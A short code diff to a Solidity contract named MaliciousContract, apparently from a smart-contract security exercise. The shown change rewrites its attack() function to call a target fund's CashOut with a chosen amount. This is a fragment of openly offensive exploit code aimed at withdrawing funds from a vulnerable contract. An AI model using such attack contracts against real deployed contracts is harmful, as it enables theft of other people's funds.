@@ -11,9 +11,9 @@ contract MaliciousContract{
         eth_FUND= ETH_FUND (_eth_FUND);
     }
 
-    function attack() public payable{
-        require(msg.value >= 1 ether, "Must send at least 1 ether");
-        eth_FUND.CashOut(msg.value);
+    function attack(uint amount) public {
+        require(amount >= 1 ether, "Must send at least 1 ether");
+        eth_FUND.CashOut(amount);
     }
 
     function deposit()  public payable{
